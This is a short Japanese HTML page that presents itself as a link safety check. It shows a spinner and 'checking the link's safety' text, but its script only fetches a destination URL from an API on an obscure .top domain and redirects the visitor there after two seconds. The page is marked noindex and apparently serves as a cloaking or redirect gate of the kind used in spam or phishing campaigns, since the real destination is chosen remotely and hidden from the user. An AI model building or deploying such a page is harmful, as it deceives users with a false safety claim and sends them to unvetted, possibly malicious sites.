<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>セキュリティ確認中...</title>
  <meta name="robots" content="noindex,nofollow">
  <style>
    body { text-align:center; font-family:sans-serif; padding-top:80px; }
    .loader {
      margin: 30px auto;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 50px; height: 50px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% {transform:rotate(0);} 100% {transform:rotate(360deg);} }
  </style>
</head>
<body>
  <h2>リンクの安全性を確認しています...</h2>
  <div class="loader"></div>
  <p>まもなくページが表示されます。</p>

  <script>
    const id = window.location.pathname.split("/").pop();
    if (!id) {
      document.body.innerHTML = "<h3>無効なIDです</h3>";
    } else {
      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + id)
        .then(r => r.json())
        .then(data => {
          const url = data?.data?.siteUrl;
          if (url) {
            setTimeout(() => location.href = url, 2000);
          } else {
            document.body.innerHTML += "<p>リダイレクト先が見つかりません。</p>";
          }
        })
        .catch(() => {
          document.body.innerHTML += "<p>エラーが発生しました。</p>";
        });
    }
  </script>
</body>
</html>
